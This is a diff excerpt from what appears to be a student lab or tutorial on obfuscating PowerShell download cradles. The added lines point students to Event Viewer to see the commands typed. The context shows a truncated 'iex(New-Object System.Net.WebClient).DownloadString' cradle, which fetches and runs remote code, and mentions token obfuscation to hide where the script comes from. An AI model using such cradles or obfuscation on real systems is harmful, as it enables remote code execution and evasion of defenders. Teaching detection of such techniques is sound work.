@@ -68,7 +68,9 @@ What can be obfuscate ? This ```iex(New-Object System.Net.WebClient).DownloadStr
 3. The argument ```System.Net.WebClient```
 4. The member ```DownloadString```
 
-As for obfuscating cradle since it will display the location of where the script will be retrieve from, we will perform more indepth obfuscation with TOKENS obfuscating.
+As for obfuscating cradle since it will display the location of where the script will be retrieve from, we will perform more indepth obfuscation with TOKENS obfuscating. 
+
+Students can proceed to "Event Viewer" to actually see the commands that have been typed out. Since we are using "powershell" as can be since when keystrokes are sent. They are most likely going to see what have been typed.
 
 # Testings Results (Powershell Script)
 ### Base without any obfuscation  
